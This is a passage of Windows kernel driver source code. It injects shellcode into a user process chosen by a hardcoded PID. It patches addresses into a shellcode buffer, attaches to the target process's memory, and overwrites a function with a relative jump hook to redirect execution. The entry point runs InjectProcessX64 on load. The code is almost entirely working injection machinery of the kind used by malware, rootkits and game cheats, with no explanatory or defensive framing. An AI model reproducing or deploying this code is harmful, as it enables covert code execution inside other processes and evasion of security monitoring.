					memcpy(shellCode + 42 + 31 + 9, &dllStats, sizeof(ULONG64));
					memcpy(shellCode + 58 + 31 + 9, &g_oep, sizeof(ULONG64));
					memcpy(shellCode + 70 + 31 + 9, &flagoverAddress, sizeof(ULONG64));
					memcpy(shellCode + 64 + 38 + 31 + 9 + 13, &tagetAddress, sizeof(ULONG64));
					memcpy(g_shellCode, shellCode, sizeof(shellCode));

					//memcpy(shellCode + 64, &tagetAddress, sizeof(ULONG64));
					//memcpy(g_shellCode, shellCode, sizeof(shellCode));
					//MapSC(shellCode, shellcodeAddress,sizeof(shellCode));

					ULONG jmpRelayAddress = (ULONG)((ULONG64)relayAddress - (ULONG64)func - 5);
					UCHAR jmpRelay[] = { 0xE9,0,0,0,0 };
					memcpy(jmpRelay + 1, &jmpRelayAddress, sizeof(ULONG));
					MapSC(jmpRelay, func, sizeof(jmpRelay));

				}__except(EXCEPTION_EXECUTE_HANDLER){}
			}
		}
		KeUnstackDetachProcess(&kApc);
		ObDereferenceObject(pEprocess);
	}
	return STATUS_SUCCESS;
}

NTSTATUS DriverUnload(PDRIVER_OBJECT pObj)
{
	UNREFERENCED_PARAMETER(pObj);

	if (g_shellCode)
	{
		Modify2KernelMem();
		ExFreePoolWithTag(g_shellCode, 'Yci');
		g_shellCode = NULL;
	}

	if (g_workItem)
	{
		ExFreePoolWithTag(g_workItem, 'Yi');
		g_workItem = NULL;
	}

	DbgPrint("See you!\n");
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pObj, PUNICODE_STRING pPath)
{
	UNREFERENCED_PARAMETER(pPath);
	pObj->DriverUnload = DriverUnload;
	//DbgBreakPoint();
	//g_injectPid = 2840;
	g_injectPid = 7524;
	InjectProcessX64(g_injectPid);
	fixTlsGetValue(g_injectPid);
	return STATUS_SUCCESS;
}